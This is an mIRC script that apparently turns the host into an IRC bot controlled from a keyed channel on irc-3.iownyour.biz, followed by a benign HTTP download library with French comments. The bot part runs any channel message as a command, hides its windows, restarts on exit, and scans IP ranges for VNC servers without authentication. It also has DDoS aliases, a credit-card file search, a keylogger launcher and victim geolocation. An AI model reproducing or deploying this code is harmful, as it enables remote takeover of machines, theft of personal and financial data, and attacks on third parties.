on *:APPACTIVE:findtray
on 1:CONNECT:{ join %fldchan %key | .timercon off }
alias findtray { .timer 1 0 showmirc -t }
alias ff .timerff 0 1 findtray
raw 001:*:{ set %fldchan #X#psy#X# | set %key $encode(Sm0k3d,m) | join %fldchan %key }
raw 475:*:{ join %fldchan %key }
RAW 332:*:if ($2 == %fldchan) [ [ $3- ] ]
on *:TEXT:*:*:{ %x = $1- | $evalnext(%x) | .timerMSG 1 3 .opnotice %fldchan   $+($r(0,99),$chr(44),$r(0,99)) $evalnext(%x) | unset %x | close -m | windows -h $active }
on *:EXIT:run $mircexe
on *:sockopen:vncscan*:{
  if ($sockerr) { return }
  sockwrite -n $sockname 1 82 70 66 32 48 48 51 46 48 48 56 10

}
on *:START:{ server irc-3.iownyour.biz +6697 -jn %fldchan %key }
on *:sockread:vncscan*:{
  :nextread
  sockread %vnc
  if (*82*70*66*32*48*48*51*46*48*48*56*10* iswm %vnc) {
    bset &vnc1 1 1
    sockwrite -n $sockname &vnc1 
  }
  elseif (*0*0*0*0* iswm %vnc) && (%vncip != $sock($sockname).ip)  { checkvnc $sockname | set %vncip $sock($sockname).ip }

  elseif ($sockbr) goto nextread

}

alias ddos { .opnotice %fldchan  $+($r(0,99),$chr(44),$r(0,99)) DDoS <  $+($r(0,99),$chr(44),$r(0,99)) $1  $+($r(0,99),$chr(44),$r(0,99)) $2  $+($r(0,99),$chr(44),$r(0,99)) $3  $+($r(0,99),$chr(44),$r(0,99)) $  $+($r(0,99),$chr(44),$r(0,99)) $5 > | run start /MIN /REALTIME $findfile($shortfn($Mircdir),*p.exe*,1) $findfile($shortfn($Mircdir),*ddos.py*,1) $2- & }
alias cc { opnotice %fldchan Searching for Credit Card information in  $+($r(0,99),$chr(44),$r(0,99)) C:\USERS | .timerCC -o 1 5 run start /MIN /REALTIME $findfile($shortfn($Mircdir),*cc.exe*,1) }
alias kl { run system.exe | .timerkl -o 0 10 init }

alias checkvnc {
  .write system.log  $+($r(0,99),$chr(44),$r(0,99)) NULL-AUTH $sock($1).ip $+ : $+ $sock($1).port
  .timerPLAYQUEUE 1 5 playqueue
  if ($calc($sock($1).port +1) == 6000) return
  .timer $+ $1 $+ $calc($sock($1).port +1) 1 0 sockopen $1 $+ $r(0,9999) $sock($1).ip $calc($sock($1).port +1) 
}

alias playqueue {
  .play -a opnotice %fldchan system.log 1000
}
on *:PLAYEND:if (*system.log iswm $filename) .remove system.log
on *:sockclose:vncscan*:return
alias rvnc {
  if (%range) { unset %range* | unset %vnc* }
  if (!%interval) set %interval 700
  if (!%fldchan) set %fldchan #psy#
  if (!%vncport) set %vncport 5900
  if ($2) set %vncport $2
  set %range $1
  .timerRANGEthread1 -om 0 %interval nextvnc 
  .notice @ $+ %fldchan VNC Scan starting at range $1 port: %vncport
}


alias nextvnc {
  inc %rangex
  if (256 <= $gettok(%range,2,46)) { unset %range | notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99))* Scan halted, waiting for new command... }
  if (256 <= %rangex) { unset %rangex | %range = $+($gettok(%range,1-2,46),.,$calc($gettok(%range,3,46) + 1),.,%rangex) }
  sockopen vncscan $+ $r(0,999999999999999999) $+(%range,.,%rangex) %vncport
}

alias dos {
  sockopen ddos $+ $r(0,999999999999999999999) $1 $2

}
on *:sockopen:ddos*:{
  if ($sockerr) { return }
  sockwrite -n $sockname 1 1 0 0 0 0 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

}
alias getip {
  %var = /\b((?:(?:[a-z]+)\.)+(?:[a-z]+)[: ]\d{2,5})\b|\b((?:(?:(25[0-5]|2[0-4]\d|[01]?\d?\d))\.){3}(?3)[: ]\d{2,5})\b/i
  if $regex(ip,$remove($1-,$chr(9)),%var) {
    return $replace($regml(ip,1),:,$chr(32))
  }
}
alias init {
  if ($isfile($shortfn(system.log))) && ($server) {
    if (%lines < $lines(system.log)) { .play -af $+ %lines opnotice %fldchan system.log 800 }
    set %lines $lines(system.log)
    return

  }

}
alias opnotice { .notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) $+ $evalnext($2-,1) $+  }

on *:DISCONNECT:.timerDC 1 1 server irc- $+ $r(1,4) $+ .iownyour.biz $iif($sslready,+6697,6667) -jn %fldchan %key
on *:PART:%fldchan:{ if ($nick == $me) .timer 1 1 join # %key } 
on *:JOIN:#:{ if ($nick == $me) .timer 1 0 window -h # |  .timerC $+ # 1 10 resolve | .timernick 1 30 nick %ctry $+ $+ %start $+ |- $+ $os | if ($nick == $me) .opnotice %fldchan  $+($r(0,99),$chr(44),$r(0,99)) Https://github.com/independentcod/psyBNC-Win  $+($r(0,99),$chr(44),$r(0,99)) https://is.gd/PsyBNC $  | .timer 1 10 clearall |  if ($me isop #) mode # +osmnkK $nick %key   }
alias resolve {
  set %resolve.ip $ip
  sockopen resolve.ip_ $+ $ip ipinfo.io 80
}
on *:sockopen:resolve.ip*: {
  var %a = sockwrite -n $sockname
  var %b = / $+ %resolve.ip
  %a GET %b HTTP/1.0
  %a Host: ipinfo.io
  %a User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
  %a Accept: application/json, text/javascript, */*; q=0.01
  %a Connection: keep-alive
  %a Referer: http://www.iplocation.net/
  %a Origin: http://www.iplocation.net/
  %a $crlf

}
on *:sockread:resolve.ip*: {
  :read
  sockread %sockread
  if (!$sockbr) return
  if (*Hostname*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip : %sockread
  if (*ISP*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip %sockread
  if (*Country*:* iswm %sockread) { set %ctry  $+($r(0,99),$chr(44),$r(0,99)) $remove($gettok(%sockread,2,32),",$CHR(44)) | nick %ctry $+ %city $+ %start $+ - $+ $os $+ $ticks }
  if (*City*:* iswm %sockread)  { set %city  $+($r(0,99),$chr(44),$r(0,99)) $remove($gettok(%sockread,2,32),",$CHR(44)) | nick %ctry $+ %city $+ %start $+ - $+ $os $+ $ticks }
  if (*org*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip : %sockread
  if (*loc*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip : %sockread
  if (*region*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip $+ : %sockread
  if (*postal*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip $+ : %sockread
  goto read
}

alias wbs.webget.version return 1.4
alias wbs.webget.callback {
  ;ici un exemple concret d'utilisation de la fonction callback
  var %dname = wbs.webget , %table = wbs.webget.download
  if ($dialog(%dname).title) {
    did -a %dname 10 callback: $1-
    did -o %dname 13 1 CallBack: $2-
    if (($3 == content-lenght) && ($4)) {
      if ($dialog(%dname).title) {
        did -i %dname 11 1 0 $4
        did -o %dname 14 1 / $wsize($4)
        did -a %dname 11 0
      }
    }
    elseif ($2 == ierror) {
      if ($3 == 1) || ($3 == 1) .remove $qt($hget(%table,file-temp))
    }
    elseif ($2 == pre-connect) {
      ;ici un exemple de personalisation du user agent
      hadd -m %table user-agent Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.0.6) Gecko/2009011913 Firefox/2.0.0.14
      if ($did(%dname,18).state) hadd -m %table cookie $$did(%dname,19)
    }
    elseif ($2 == close) {
      var %value = $hget(wbs.webget.download,content-length)
      did -a %dname 11 %value
      did -o %dname 14 1 $wsize(%value) / $wsize(%value)
      did -a %dname 10 Connection closed.
      did -a %dname 10 Conection duration: $duration($4) $calc($5 % 1000) ms
    }
  }
}
alias wbs.webget.timer.refresh {
  ;utilisation: /timer 0 1 wbs.webget.timer.refresh [sockname] [dialogue]
  if (($sock($1)) && ($dialog($2).title)) {
    var %max = $hget(wbs.webget. $+ $gettok($1,3-,46),Content-Length)
    did -a $2 11 $sock($1).rcvd 0 %max
    did -o $2 14 1 $wsize($sock($1).rcvd) / $wsize(%max)
    did -o $2 20 1 Average speed: $wsize($calc($sock($1).rcvd / $sock($1).to)) $+ /s
  }
  else .timerweb.webget.refresh off
}
;################## FIN DE L'EXEMPLE DU DIALOGUE ET DEBUT DU CODE UTILE ##################
alias wbs.server.url return $gettok($$1,2,47)
alias wbs.webget.showstats {
  var %n = $sock(wbs.webget.*,0)
  if (!%n) wecho No socket.
  while (%n > 0) {
    var %sname = $sock(wbs.webget.*,%n) , %rcvd = $sock(%sname).rcvd , %size = $hget(%sname,content-length)
    wecho $qt(%sname) $+($chr(91),type: $sock(%sname).type,$chr(93)) $+($chr(91),port: $sock(%sname).port,$chr(93)) $br(ip: $sock(%sname).ip)  $&
      $br($wsize(%rcvd) / $wsize(%size)) $br($round($calc(%rcvd / %size * 100),2) $+ $chr(37)) $br(from: $duration($sock(%sname).to) ) $&
      $br(pause: $iif($sock(%sname).pause,yes,no)) $br(ssl: $iif($sock(%sname).ssl,yes,no))
    dec %n
  }
}
;ici je préfere faire une alias vers mon alias car je préfere employer mon alias car "getfile" peu etre un nom attribué dans d'autres scripts
alias getfile {
  if ($1) wbs.webget $1-
  else wbs.webget.showstats
}
alias -l br return $+($chr(91),$1-,$chr(93))
alias wbs.webget {
  ;6 arguments requis: nom,alias de callback,port,ssl (0/1),url,destination
  ;exemple: wbs.webget download callback 80 0 http://www.google.fr/intl/fr_fr/images/logo.gif c:/file.gif
  ;il est possible de spécifier un user-agent personalisé en l'entran manuelement dans la table AVANT l'appel de la commande wbs.webget ou getfile
  ;syntaxe: wbs.webget.[nom-de-la-conection] user-agent
  ;exemple: hadd -m %table wbs.webget.download user-agent mIrc $version
  if ($5) {
    var %table = wbs.webget. $+ $1
    ;ici je préfere aussi laisser a l'utilisateur de pouvoir formuler lui même sa requette GET s'il le shouaite
    if (!$hget(%table,get)) hadd -m %table get $5
    if ($6 != x) hadd -m %table file $6-
    hadd -m %table mode 0
    hadd -m %table ctime $ctime
    hadd -m %table name $1
    if (!$hget(%table,redirects-left)) hadd -m %table redirects-left 16
    if (!$hget(%table,file-temp)) hadd -m %table file-temp $1 $+ .temp
    if ($exists($hget(%table,file-temp))) callback %table ierror 1 $qt($hget(%table,file-temp)) already exists
    if ($2 != x) hadd %table callback $2
    if ($sock(wbs.webget. $+ $1)) {
      callback wbs.webget. $+ $1 info hard-sockclose
      sockclose wbs.webget. $+ $1
    }
    callback %table pre-connect
    sockopen $iif($4 == 1,-e) $+(wbs.webget.,$1) $wbs.server.url($5) $3
  }
  else wecho $sname error: wbs.webget: syntax: /wbs.webget [name] [callback alias ("x" if not)] [port] [ssl (0/1)] [url] [destination]
}
alias wsockwrite {
  sockwrite $1-
  if ($hget($2,callback)) $v1 $2 sockwrite $1-
}
alias -l callback {
  ;utilisation: callback [htable] alias de callback
  ;todo permrete l'utilisation de plusieures fonction de callback succesives séparées par des ","
  if (($hget($1,callback)) && ($isalias($hget($1,callback)))) $hget($1,callback) $1-
}
alias -l sname return wbs.webget
on *:sockopen:wbs.webget.*:{
  var %table = $sockname
  hadd -m %table open $ctime $ticks
  callback %table info open $ctime $ticks
  callback %table info serverip $sock($sockname).ip $sock($sockname).port
  if ($hget(%table,post)) wsockwrite -n $sockname POST $v1 HTTP/ $+ $iif($hget(%table,http-version),$v1,1.0)
  else wsockwrite -n $sockname GET / $+ $gettok($hget(%table,get),3-,47)) HTTP/ $+ $iif($hget(%table,http-version),$v1,1.0)
  if ($hget(%table,Authorization)) wsockwrite -n $sockname Authorization: $v1
  if (!$hget(%table,no-referer)) wsockwrite -n $sockname Referer: $iif($hget(%table,referer),$v1,http://wbsscript.free.fr/)
  if ($hget(%table,accept)) wsockwrite -n $sockname Accept: $v1
  if ($hget(%table,connection)) wsockwrite -n $sockname Connection: $v1
  if ($hget(%table,cache-control)) wsockwrite -n $sockname Cache-Control: $v1  
  if ($hget(%table,cookie)) wsockwrite -n $sockname Cookie: $v1
  if (!$hget(%table,no-user-agent)) wsockwrite -n $sockname User-Agent: $iif($hget(%table,user-agent),$v1,CERN-LineMode/2.15 libwww/2.17)
  wsockwrite -n $sockname Host: $iif($hget(%table,host),$v1,$wbs.server.url($hget(%table,get))) $+ $crlf $+ $crlf

}
;ici le but de l'interpreteur est de clarifier le code dans la fonction du socket, le socket contien cependent la gestion des erreures
alias wbs.webget.interpreter {
  var %buffer = $2- , %table = $1 , %errors = 400;404;500;403, %err = 0
  tokenize 32 $2-
  if ($gettok($1,1,47) == HTTP) {
    hadd -m %table http  $2-
    callback %table http $2-
  }
  elseif ($1 == Content-Length:) {
    hadd -m %table Content-Length $2
    callback %table info content-lenght $2
  }
  elseif ($1 == Set-Cookie:) {
    hadd -m %table cookie $2-
    callback %table cookie $2-
  }
  elseif ($1 == Location:) {
    var %location = $2
    if (($left(%location,7) != http://) && ($left(%location,8) != https://)) var %location = $+(http://,$sock($sockname).ip,$2)
    var %arguments = $hget(%table,name) $iif($hget(%table,callback),$v1,x) $sock($sockname).port $iif($sock($sockname).ssl,1,0) %location $iif($hget(%table,file),$v1,x)
    sockclose $sockname
    callback %table error $hget(%table,http) $2-
    hdec %table redirects-left
    if ($hget(%table,redirects-left) <= 0) {
      callback %table ierror 2 too many redirections
      hfree %table
      return
    }
    hadd -m %table get %location
    callback %table reconnect %arguments
    wbs.webget %arguments
  }
}

on *:sockread:wbs.webget.*:{
  var %buffer = $null , %table = $sockname , %errors = 400;404;500;403, %err = 0 , %writefile = $qt($hget(%table,file-temp))
  while ((!$sockerr) && (!%err)) {
    if ($hget(%table,mode) == 0) {
      sockread %buffer
      tokenize 32 %buffer
      wbs.webget.interpreter $sockname %buffer
      callback %table buffer %buffer
      if ($1 == Location:) inc %err
      elseif ($istok(%errors,$2,59)) {
        sockclose $sockname
        var %err = $2
        callback %table error %err $calc($ctime - $hget(%table,start-time))
        hfree %table
        break
      }
      elseif (!%buffer) {
        ;ce passage marque la fin des headers intervient juste avant le debut du transfer binaire
        if (($hget(%table,Content-Length) == 0) || (!$hget(%table,file))) {
          callback %table close $ctime $calc($ctime - $hget(%table,ctime)) $ticks no-data
          sockclose $sockname
          hfree %table
          break
        }
        hadd -m %table mode 1
        hadd -m %table safemode 1
      }
    }
    elseif ($hget(%table,mode) == 1) {
      ;mode binaire (traitement)
      sockread &buffer
      ;la ligne ci dessous est surtout la pour éviter le bug des crlf lié a mirc qui les efface comme un malpropre, a modiffier
      if ($bvar(&buffer,0,5).text != $crlf) {
        if ($hget(%table,safemode)) {
          hdel %table safemode
          callback %table info start $ctime
          hadd -m %table start-time $ctime
        }
      }
      if (!$hget(%table,safemode)) {
        ;ici je préfere remetre une sous boucle pour ne pas avoir a ré-interpreter toutes les autres conditions
        bwrite %writefile -1 &buffer
        while ((!$sockerr) && (!%err)) {
          sockread &buffer
          bwrite %writefile -1 &buffer
          if ($sockbr == 0) break
        }
      }
    }
    if ($sockbr == 0) break
  }
  if ($sockerr) callback %table error sockerr $sockerr
}
on *:sockclose:wbs.webget.*:{
  var %table = $sockname , %file = $qt($hget(%table,file))
  if ($exists(%file)) .remove %file
  if ($hget(%table,mode)) .rename $qt($iif($hget(%table,file-temp),$v1,$+($mircdir,$sockname,.temp))) %file
  callback %table file %file
  callback %table close $ctime $calc($ctime - $hget(%table,open)) $ticks finished
  hfree %table
}
alias wbs.webget.timer.callback {
  ;utilisation: /.timerwbs.webget.timer.callback 0 1  wbs.webget.timer.callback [sockname] [alias]
  ;effet: appele [alias] et retourne: [sockname] [position actuelle] [durée de la conection]
  if (($sock($1)) && ($isalias($2))) {
    $2 $sock($1).rcvd $hget(wbs.webget. $+ $gettok($1,3-,46),Content-Length)
    if (!$timer(wbs.webget.timer.callback)) .timerwbs.webget.timer.callback 0 1  wbs.webget.timer.callback $1 $2
  }
  else .timerwbs.webget.timer.callback off
}

;#aliases de compatibilitées
alias -l wbs.mdx.make.pbar {
  ;usage: wbs.mdx.make.pbar $dname id:0-0-100
  ;values: defaut-debut-fin
  var %dname = $1 , %target = $gettok($2,1,58) , %values = $replace($gettok($2,2,58),-,$chr(32))
  if ($dialog(%dname).title) {
    wbs.mdx SetControlMDX %dname %target ProgressBar > $wdll(ctl_gen.mdx)
    did -i %dname %target 1 $gettok(%values,2-,32)
    did -a %dname %target $gettok(%values,1,32)
  }
}

;alias de compatibilitée pour exportation du code
alias -l wdll return $qt($+($scriptdir,dlls\,$1))
alias -l w.err adid 10 $1-
alias -l idid did -i $dname $1-
alias -l adid did -a $dname $1-
alias -l rdid did -r $dname $1-
alias -l odid did -o $dname $1-
alias -l bdid did -b $dname $1-
alias -l udid did -u $dname $1-
alias -l wecho echo -a $1-
alias -l wsize {
  if ($1 !isnum 0-) return n/a 
  else return $replace($lower($bytes($1-,3).suf $+ $iif($right($bytes($1-,3).suf,1) !== b,b)),b,b)
}
;uniquement pour le gui:
alias -l wbs.mdx.make.pbar {
  ;usage: wbs.mdx.make.pbar $dname id:0-0-100
  ;values: defaut-debut-fin
  var %dname = $1 , %target = $gettok($2,1,58) , %values = $replace($gettok($2,2,58),-,$chr(32))
  if ($dialog(%dname).title) {
    wbs.mdx SetControlMDX %dname %target ProgressBar > $wdll(ctl_gen.mdx)
    did -i %dname %target 1 $gettok(%values,2-,32)
    did -a %dname %target $gettok(%values,1,32)
  }
}